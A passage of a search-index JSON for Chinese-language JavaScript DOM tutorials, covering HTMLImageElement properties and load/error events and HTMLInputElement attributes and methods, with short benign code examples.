\u5c5e\u6027\u3002","title":"HTMLImageElement.width\uff0cHTMLImageElement.height"},{"location":"elements/image/#htmlimageelementnaturalwidthhtmlimageelementnaturalheight","text":"HTMLImageElement.naturalWidth \u5c5e\u6027\u8868\u793a\u56fe\u50cf\u7684\u5b9e\u9645\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c HTMLImageElement.naturalHeight \u5c5e\u6027\u8868\u793a\u5b9e\u9645\u9ad8\u5ea6\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\u3002 \u5982\u679c\u56fe\u50cf\u8fd8\u6ca1\u6709\u6307\u5b9a\u6216\u4e0d\u53ef\u5f97\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u7b49\u4e8e 0 \u3002 1 2 3 4 var img = document . getElementById ( 'img' ); if ( img . naturalHeight > img . naturalWidth ) { img . classList . add ( 'portrait' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u56fe\u7247\u7684\u9ad8\u5ea6\u5927\u4e8e\u5bbd\u5ea6\uff0c\u5219\u8bbe\u4e3a portrait \u6a21\u5f0f\u3002","title":"HTMLImageElement.naturalWidth\uff0cHTMLImageElement.naturalHeight"},{"location":"elements/image/#htmlimageelementcomplete","text":"HTMLImageElement.complete \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u56fe\u8868\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u5b8c\u6210\u3002\u5982\u679c <img> \u5143\u7d20\u6ca1\u6709 src \u5c5e\u6027\uff0c\u4e5f\u4f1a\u8fd4\u56de true \u3002","title":"HTMLImageElement.complete"},{"location":"elements/image/#htmlimageelementcrossorigin","text":"HTMLImageElement.crossOrigin \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199 <img> \u5143\u7d20\u7684 crossorigin \u5c5e\u6027\uff0c\u8868\u793a\u8de8\u57df\u8bbe\u7f6e\u3002 \u8fd9\u4e2a\u5c5e\u6027\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\u3002 anonymous \uff1a\u8de8\u57df\u8bf7\u6c42\u4e0d\u8981\u6c42\u7528\u6237\u8eab\u4efd\uff08credentials\uff09\uff0c\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002 use-credentials \uff1a\u8de8\u57df\u8bf7\u6c42\u8981\u6c42\u7528\u6237\u8eab\u4efd\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <img crossorigin=\"anonymous\" id=\"myImg\" src=\"pic.jpg\"> var img = document . getElementById ( 'img' ); img . crossOrigin // \"anonymous\"","title":"HTMLImageElement.crossOrigin"},{"location":"elements/image/#htmlimageelementreferrerpolicy","text":"HTMLImageElement.referrerPolicy \u7528\u6765\u8bfb\u5199 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 referrerpolicy \uff0c\u8868\u793a\u8bf7\u6c42\u56fe\u50cf\u8d44\u6e90\u65f6\uff0c\u5982\u4f55\u5904\u7406 HTTP \u8bf7\u6c42\u7684 referrer \u5b57\u6bb5\u3002 \u5b83\u6709\u4e94\u4e2a\u53ef\u80fd\u7684\u503c\u3002 no-referrer \uff1a\u4e0d\u5e26\u6709 referrer \u5b57\u6bb5\u3002 no-referrer-when-downgrade \uff1a\u5982\u679c\u8bf7\u6c42\u7684\u5730\u5740\u4e0d\u662f HTTPS \u534f\u8bae\uff0c\u5c31\u4e0d\u5e26\u6709 referrer \u5b57\u6bb5\uff0c\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002 origin \uff1a referrer \u5b57\u6bb5\u662f\u5f53\u524d\u7f51\u9875\u7684\u5730\u5740\uff0c\u5305\u542b\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u3002 origin-when-cross-origin \uff1a\u5982\u679c\u8bf7\u6c42\u7684\u5730\u5740\u4e0e\u5f53\u524d\u7f51\u9875\u662f\u540c\u6e90\u5173\u7cfb\uff0c\u90a3\u4e48 referrer \u5b57\u6bb5\u5c06\u5e26\u6709\u5b8c\u6574\u8def\u5f84\uff0c\u5426\u5219\u5c06\u53ea\u5305\u542b\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u3002 unsafe-url \uff1a referrer \u5b57\u6bb5\u5305\u542b\u5f53\u524d\u7f51\u9875\u7684\u5730\u5740\uff0c\u9664\u4e86\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u4ee5\u5916\uff0c\u8fd8\u5305\u62ec\u8def\u5f84\u3002\u8fd9\u4e2a\u8bbe\u7f6e\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u4f1a\u6cc4\u6f0f\u8def\u5f84\u4fe1\u606f\u3002","title":"HTMLImageElement.referrerPolicy"},{"location":"elements/image/#htmlimageelementxhtmlimageelementy","text":"HTMLImageElement.x \u5c5e\u6027\u8fd4\u56de\u56fe\u50cf\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\uff0c HTMLImageElement.y \u5c5e\u6027\u8fd4\u56de\u7eb5\u5750\u6807\u3002","title":"HTMLImageElement.x\uff0cHTMLImageElement.y"},{"location":"elements/image/#_4","text":"\u56fe\u50cf\u52a0\u8f7d\u5b8c\u6210\uff0c\u4f1a\u89e6\u53d1 onload \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a <img src=\"example.jpg\" onload=\"loadImage()\"> function loadImage () { console . log ( 'Image is loaded' ); } \u56fe\u50cf\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\uff0c\u4f1a\u89e6\u53d1 onerror \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a <img src=\"image.gif\" onerror=\"myFunction()\"> function myFunction () { console . log ( 'There is something wrong' ); }","title":"\u4e8b\u4ef6\u5c5e\u6027"},{"location":"elements/input/","text":"\u5143\u7d20 \u00b6 <input> \u5143\u7d20\u4e3b\u8981\u7528\u4e8e\u8868\u5355\u7ec4\u4ef6\uff0c\u5b83\u7ee7\u627f\u4e86 HTMLInputElement \u63a5\u53e3\u3002 HTMLInputElement \u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 \u7279\u5f81\u5c5e\u6027 \u00b6 name \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u540d\u79f0\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 type \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u7c7b\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 disabled \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a <input> \u8282\u70b9\u662f\u5426\u7981\u6b62\u4f7f\u7528\u3002\u4e00\u65e6\u88ab\u7981\u6b62\u4f7f\u7528\uff0c\u8868\u5355\u63d0\u4ea4\u65f6\u4e0d\u4f1a\u5305\u542b\u8be5 <input> \u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 autofocus \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9875\u9762\u52a0\u8f7d\u65f6\uff0c\u8be5\u5143\u7d20\u662f\u5426\u4f1a\u81ea\u52a8\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 required \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8be5 <input> \u5143\u7d20\u662f\u5426\u5fc5\u586b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 value \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 validity \uff1a\u8fd4\u56de\u4e00\u4e2a ValidityState \u5bf9\u8c61\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u6821\u9a8c\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 validationMessage \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u6821\u9a8c\u5931\u8d25\u65f6\uff0c\u7528\u6237\u770b\u5230\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5982\u679c\u8be5\u8282\u70b9\u4e0d\u9700\u8981\u6821\u9a8c\uff0c\u6216\u8005\u901a\u8fc7\u6821\u9a8c\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 willValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8be5 <input> \u5143\u7d20\u662f\u5426\u4f1a\u88ab\u6821\u9a8c\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u8868\u5355\u76f8\u5173\u5c5e\u6027 \u00b6 form \uff1a\u8fd4\u56de <input> \u5143\u7d20\u6240\u5728\u7684\u8868\u5355\uff08 <form> \uff09\u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 formAction \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u7684\u670d\u52a1\u5668\u76ee\u6807\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 action \u5c5e\u6027\u3002 formEncType \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 enctype \u7684\u5c5e\u6027\u3002 formMethod \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u7684 HTTP \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 method \u5c5e\u6027\u3002 formNoValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u662f\u5426\u8981\u8df3\u8fc7\u6821\u9a8c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 formNoValidate \u5c5e\u6027\u3002 formTarget \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u540e\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u6570\u636e\u7684\u6253\u5f00\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 target \u5c5e\u6027\u3002 \u6587\u672c\u8f93\u5165\u6846\u7684\u7279\u6709\u5c5e\u6027 \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u53ea\u6709\u5728 <input> \u5143\u7d20\u53ef\u4ee5\u8f93\u5165\u6587\u672c\u65f6\u624d\u6709\u6548\u3002 autocomplete \uff1a\u5b57\u7b26\u4e32 on \u6216 off \uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u8f93\u5165\u5185\u5bb9\u53ef\u4ee5\u88ab\u6d4f\u89c8\u5668\u81ea\u52a8\u8865\u5168\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 maxLength \uff1a\u6574\u6570\uff0c\u8868\u793a\u53ef\u4ee5\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6700\u5927\u957f\u5ea6\u3002\u5982\u679c\u8bbe\u4e3a\u8d1f\u6574\u6570\uff0c\u4f1a\u62a5\u9519\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 size \uff1a\u6574\u6570\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u663e\u793a\u957f\u5ea6\u3002\u5982\u679c\u7c7b\u578b\u662f text \u6216 password \uff0c\u8be5\u5c5e\u6027\u7684\u5355\u4f4d\u662f\u5b57\u7b26\u4e2a\u6570\uff0c\u5426\u5219\u5355\u4f4d\u662f\u50cf\u7d20\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 pattern \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u503c\u5e94\u8be5\u6ee1\u8db3\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 placeholder \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u5360\u4f4d\u7b26\uff0c\u4f5c\u4e3a\u5bf9\u5143\u7d20\u7684\u63d0\u793a\u3002\u8be5\u5b57\u7b26\u4e32\u4e0d\u80fd\u5305\u542b\u56de\u8f66\u6216\u6362\u884c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 readOnly \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u8be5\u8282\u70b9\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 min \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8282\u70b9\u7684\u6700\u5c0f\u6570\u503c\u6216\u65e5\u671f\uff0c\u4e14\u4e0d\u80fd\u5927\u4e8e max \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 max \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8282\u70b9\u7684\u6700\u5927\u6570\u503c\u6216\u65e5\u671f\uff0c\u4e14\u4e0d\u80fd\u5c0f\u4e8e min \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionStart \uff1a\u6574\u6570\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u8fd4\u56de\u5149\u6807\u5728 <input> \u5143\u7d20\u5185\u90e8\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionEnd \uff1a\u6574\u6570\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u7ed3\u675f\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u8fd4\u56de\u5149\u6807\u5728 <input> \u5143\u7d20\u5185\u90e8\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionDirection \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u65b9\u5411\u3002\u53ef\u80fd\u7684\u503c\u5305\u62ec forward \uff08\u4e0e\u6587\u5b57\u4e66\u5199\u65b9\u5411\u4e00\u81f4\uff09\u3001 backward \uff08\u4e0e\u6587\u5b57\u4e66\u5199\u65b9\u5411\u76f8\u53cd\uff09\u548c none \uff08\u6587\u5b57\u65b9\u5411\u672a\u77e5\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \u590d\u9009\u6846\u548c\u5355\u9009\u6846\u7684\u7279\u6709\u5c5e\u6027 \u00b6 \u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f\u590d\u9009\u6846\uff08checkbox\uff09\u6216\u5355\u9009\u6846\uff08radio\uff09\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 checked \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u662f\u5426\u9009\u4e2d\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 defaultChecked \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u9ed8\u8ba4\u662f\u5426\u9009\u4e2d\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 indeterminate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u662f\u5426\u8fd8\u6ca1\u6709\u786e\u5b9a\u7684\u72b6\u6001\u3002\u4e00\u65e6\u7528\u6237\u70b9\u51fb\u8fc7\u4e00\u6b21\uff0c\u8be5\u5c5e\u6027\u5c31\u4f1a\u53d8\u6210 false \uff0c\u8868\u793a\u7528\u6237\u5df2\u7ecf\u7ed9\u51fa\u786e\u5b9a\u7684\u72b6\u6001\u4e86\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \u56fe\u50cf\u6309\u94ae\u7684\u7279\u6709\u5c5e\u6027 \u00b6 \u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f image \uff0c\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u56fe\u50cf\u6309\u94ae\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 alt \uff1a\u5b57\u7b26\u4e32\uff0c\u56fe\u50cf\u65e0\u6cd5\u663e\u793a\u65f6\u7684\u66ff\u4ee3\u6587\u672c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 height \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 src \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u56fe\u7247\u6765\u6e90\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 width \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \u6587\u4ef6\u4e0a\u4f20\u6309\u94ae\u7684\u7279\u6709\u5c5e\u6027 \u00b6 \u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f file \uff0c\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u6309\u94ae\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 accept \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u53ef\u4ee5\u63a5\u53d7\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u7c7b\u578b\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 files \uff1a\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u9009\u4e2d\u4e0a\u4f20\u7684\u4e00\u7ec4 File \u5b9e\u4f8b\u5bf9\u8c61\u3002 \u5176\u4ed6\u5c5e\u6027 \u00b6 defaultValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u539f\u59cb\u503c\u3002 dirName \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u5b57\u65b9\u5411\u3002 accessKey \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8ba9\u8be5 <input> \u8282\u70b9\u83b7\u5f97\u7126\u70b9\u7684\u67d0\u4e2a\u5b57\u6bcd\u952e\u3002 list \uff1a\u8fd4\u56de\u4e00\u4e2a <datalist> \u8282\u70b9\uff0c\u8be5\u8282\u70b9\u5fc5\u987b\u7ed1\u5b9a <input> \u5143\u7d20\uff0c\u4e14 <input> \u5143\u7d20\u7684\u7c7b\u578b\u5fc5\u987b\u53ef\u4ee5\u8f93\u5165\u6587\u672c\uff0c\u5426\u5219\u65e0\u6548\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 multiple \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u53ef\u4ee5\u9009\u62e9\u591a\u4e2a\u503c\u3002 labels \uff1a\u8fd4\u56de\u4e00\u4e2a NodeList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u7ed1\u5b9a\u5f53\u524d <input> \u8282\u70b9\u7684 <label> \u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 step \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5728 min \u5c5e\u6027\u5230 max \u5c5e\u6027\u4e4b\u95f4\uff0c\u6bcf\u6b21\u9012\u589e\u6216\u9012\u51cf\u65f6\u7684\u6570\u503c\u6216\u65f6\u95f4\u3002 valueAsDate \uff1a Date \u5b9e\u4f8b\uff0c\u4e00\u65e6\u8bbe\u7f6e\uff0c\u8be5 <input> \u5143\u7d20\u7684\u503c\u4f1a\u88ab\u89e3\u91ca\u4e3a\u6307\u5b9a\u7684\u65e5\u671f\u3002\u5982\u679c\u65e0\u6cd5\u89e3\u6790\u8be5\u5c5e\u6027\u7684\u503c\uff0c <input> \u8282\u70b9\u7684\u503c\u5c06\u662f null \u3002 valueAsNumber \uff1a\u6d6e\u70b9\u6570\uff0c\u5f53\u524d <input> \u5143\u7d20\u7684\u503c\u4f1a\u88ab\u89e3\u6790\u4e3a\u8fd9\u4e2a\u6570\u503c\u3002 HTMLInputElement \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 focus() \uff1a\u5f53\u524d <input> \u5143\u7d20\u83b7\u5f97\u7126\u70b9\u3002 blur() \uff1a\u79fb\u9664 <input> \u5143\u7d20\u7684\u7126\u70b9\u3002 select() \uff1a\u9009\u4e2d <input> \u5143\u7d20\u5185\u90e8\u7684\u6240\u6709\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u4e0d\u80fd\u4fdd\u8bc1 <input> \u83b7\u5f97\u7126\u70b9\uff0c\u6700\u597d\u5148\u7528 focus() \u65b9\u6cd5\uff0c\u518d\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 click() \uff1a\u6a21\u62df\u9f20\u6807\u70b9\u51fb\u5f53\u524d\u7684 <input> \u5143\u7d20\u3002 setSelectionRange() \uff1a\u9009\u4e2d <input> \u5143\u7d20\u5185\u90e8\u7684\u4e00\u6bb5\u6587\u672c\uff0c\u4f46\u4e0d\u4f1a\u5c06\u7126\u70b9\u8f6c\u79fb\u5230\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u7684\u4f4d\u7f6e\uff08\u4e0d\u5305\u62ec\u8be5\u4f4d\u7f6e\uff09\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u9009\u62e9\u7684\u65b9\u5411\uff0c\u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff08 forward \u3001 backward \u548c\u9ed8\u8ba4\u503c none \uff09\u3002 setRangeText() \uff1a\u65b0\u6587\u672c\u66ff\u6362\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u65b0\u6587\u672c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u66ff\u6362\u7684\u5f00\u59cb\u4f4d\u7f6e(\u4ece 0 \u5f00\u59cb\u8ba1\u7b97)\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u4f4d\u7f6e\uff08\u8be5\u4f4d\u7f6e\u4e0d\u5305\u62ec\u5728\u5185\uff09\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u8868\u793a\u66ff\u6362\u540e\u7684\u884c\u4e3a\uff08\u53ef\u9009\uff09\uff0c\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1a select \uff08\u9009\u4e2d\u65b0\u63d2\u5165\u7684\u6587\u672c\uff09\u3001 start \uff08\u5149\u6807\u4f4d\u7f6e\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u524d\uff09\u3001 end \uff08\u5149\u6807\u4f4d\u7f6e\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u540e\uff09\u3001 preserve \uff08\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u539f\u5148\u5c31\u6709\u6587\u672c\u88ab\u9009\u4e2d\u4e14\u672c\u6b21\u66ff\u6362\u4f4d\u7f6e\u4e0e\u539f\u5148\u9009\u4e2d\u4f4d\u7f6e\u6709\u4ea4\u96c6\uff0c\u5219\u66ff\u6362\u540e\u540c\u65f6\u9009\u4e2d\u65b0\u63d2\u5165\u7684\u6587\u672c\u4e0e\u539f\u5148\u9009\u4e2d\u7684\u6587\u672c\uff0c\u5426\u5219\u4fdd\u6301\u539f\u5148\u9009\u4e2d\u7684\u6587\u672c\uff09\u3002 setCustomValidity() \uff1a\u8be5\u65b9\u6cd5\u7528\u4e8e\u81ea\u5b9a\u4e49\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u62a5\u9519\u7684\u63d0\u793a\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\uff0c\u8be5\u5b57\u6bb5\u5c31\u4e0d\u4f1a\u6821\u9a8c\u901a\u8fc7\u4e86\uff0c\u56e0\u6b64\u7528\u6237\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u5c06\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 checkValidity() \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u6821\u9a8c\u7ed3\u679c\u3002\u5982\u679c\u8fd4\u56de false \uff0c\u8868\u793a\u4e0d\u6ee1\u8db3\u6821\u9a8c\u8981\u6c42\uff0c\u5426\u5219\u5c31\u662f\u6821\u9a8c\u6210\u529f\u6216\u4e0d\u5fc5\u6821\u9a8c\u3002 stepDown() \uff1a\u5c06\u5f53\u524d <input> \u8282\u70b9\u7684\u503c\u51cf\u5c11\u4e00\u4e2a\u6b65\u957f\u3002\u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 n \u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4e00\u6b21\u6027\u51cf\u5c11 n \u4e2a\u6b65\u957f\uff0c\u9ed8\u8ba4\u662f 1 \u3002\u6709\u51e0\u79cd\u60c5\u51b5\u4f1a\u629b\u9519\uff1a\u5f53\u524d <input> \u8282\u70b9\u4e0d\u9002\u5408\u9012\u51cf\u6216\u9012\u589e\u3001\u5f53\u524d\u8282\u70b9\u6ca1\u6709 step \u5c5e\u6027\u3001 <input> \u8282\u70b9\u7684\u503c\u4e0d\u80fd\u8f6c\u4e3a\u6570\u5b57\u3001\u9012\u51cf\u4e4b\u540e\u7684\u503c\u5c0f\u4e8e min \u5c5e\u6027\u6216\u5927\u4e8e max \u5c5e\u6027\u3002 stepUp() \uff1a\u5c06\u5f53\u524d <input> \u8282\u70b9\u7684\u503c\u589e\u52a0\u4e00\u4e2a\u6b65\u957f\u3002\u5176\u4ed6\u4e0e stepDown() \u65b9\u6cd5\u76f8\u540c\u3002 \u4e0b\u9762\u662f setSelectionRange() \u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 /* HTML \u4ee3\u7801\u5982\u4e0b <p><input 